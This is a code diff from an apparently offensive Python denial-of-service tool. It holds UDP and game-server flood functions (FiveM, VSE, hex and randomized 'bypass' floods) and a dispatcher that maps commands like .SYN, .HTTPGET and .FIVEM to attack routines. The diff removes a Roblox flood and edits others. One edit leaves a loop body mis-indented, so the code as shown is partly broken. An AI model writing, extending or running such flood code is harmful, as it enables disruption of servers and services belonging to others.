@@ -21,17 +21,6 @@ base_user_agents = [
 def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 
-def attack_roblox(ip, port, secs):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1024)
-        dport = random.randint(1, 65535) if port == 0 else port
-        for _ in range(1500):
-            ran = random.randrange(10 ** 80)
-            hex = "%064x" % ran
-            hex = hex[:64]
-            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
-
 def attack_fivem(ip, port, secs):
     payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -54,9 +43,12 @@ def attack_vse(ip, port, secs):
     while time.time() < secs:
         s.sendto(payload, (ip, port))
 
+
 def attack_hex(ip, port, secs):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
     payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
+    hex = payload + bytes
     while time.time() < secs:
         s.sendto(payload, (ip, port))
 
@@ -68,15 +60,13 @@ def attack_udp_bypass(ip, port, secs):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while time.time() < secs:
-        try:
             packet_size = random.choice(PACKET_SIZES) 
             packet = random._urandom(packet_size)
             sock.sendto(packet, (ip, port))
             delay = random.uniform(*DELAY_RANGE)
             time.sleep(delay)
-        except:
-            print('error')
-        print('attack sended')
+
+            
 def attack_udp(ip, port, secs):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = random._urandom(1024)
@@ -165,7 +155,6 @@ def lunch_attack(method, ip, port, secs):
         '.SYN': attack_syn,
         '.VSE': attack_vse,
         '.MCPE': attack_mcpe,
-        '.ROBLOX': attack_roblox, # HEXadecimal Flood
         '.FIVEM': attack_fivem,
         '.HTTPGET': attack_http_get,
         '.HTTPPOST': attack_http_post,
